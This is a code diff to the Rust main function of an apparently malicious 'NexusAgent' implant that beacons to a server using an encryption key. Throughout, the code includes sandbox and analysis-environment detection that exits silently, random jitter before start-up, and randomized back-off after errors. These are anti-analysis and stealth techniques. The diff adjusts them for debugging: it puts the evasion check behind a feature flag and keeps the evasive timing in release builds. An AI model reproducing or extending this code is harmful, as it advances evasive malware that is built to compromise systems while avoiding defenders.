@@ -23,14 +23,26 @@ async fn main() -> Result<()> {
     env_logger::init();
 
     // Perform environment checks for sandbox/analysis detection
+    // TEMPORARILY DISABLED FOR DEBUGGING
+    #[cfg(feature = "enable-evasion")]
     if EnvironmentChecker::is_analysis_environment().await {
-        // Exit silently if we detect analysis environment
+        #[cfg(debug_assertions)]
+        println!("Environment check detected analysis environment, exiting...");
         return Ok(());
     }
 
-    // Add initial jitter delay
-    let jitter = rand::random::<u64>() % 30 + 10;
-    sleep(Duration::from_secs(jitter)).await;
+    #[cfg(debug_assertions)]
+    println!("Environment checks passed or disabled, continuing...");
+
+    // Add initial jitter delay - REDUCED FOR DEBUGGING
+    #[cfg(debug_assertions)]
+    println!("Skipping initial jitter delay for debugging...");
+
+    #[cfg(not(debug_assertions))]
+    {
+        let jitter = rand::random::<u64>() % 30 + 10;
+        sleep(Duration::from_secs(jitter)).await;
+    }
 
     // Parse command line arguments with proper flag handling
     let args: Vec<String> = env::args().collect();
@@ -55,7 +67,21 @@ async fn main() -> Result<()> {
     ];
 
     // Initialize the agent
-    let mut agent = NexusAgent::new(server_addr, encryption_key).await?;
+    #[cfg(debug_assertions)]
+    println!("Initializing agent...");
+
+    let mut agent = match NexusAgent::new(server_addr, encryption_key).await {
+        Ok(agent) => {
+            #[cfg(debug_assertions)]
+            println!("Agent initialized successfully!");
+            agent
+        }
+        Err(e) => {
+            #[cfg(debug_assertions)]
+            eprintln!("Failed to initialize agent: {}", e);
+            return Err(e);
+        }
+    };
 
     // Main agent loop with error recovery
     loop {
@@ -70,9 +96,20 @@ async fn main() -> Result<()> {
                 #[cfg(debug_assertions)]
                 eprintln!("Agent cycle error: {}", e);
 
-                // Exponential backoff on errors
-                let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
-                sleep(Duration::from_secs(error_delay)).await;
+                // Reduced retry delay for debugging
+                #[cfg(debug_assertions)]
+                {
+                    let error_delay = rand::random::<u64>() % 10 + 5; // 5-15 seconds for debugging
+                    println!("Retrying in {} seconds...", error_delay);
+                    sleep(Duration::from_secs(error_delay)).await;
+                }
+
+                #[cfg(not(debug_assertions))]
+                {
+                    // Exponential backoff on errors in production
+                    let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
+                    sleep(Duration::from_secs(error_delay)).await;
+                }
             }
         }
     }
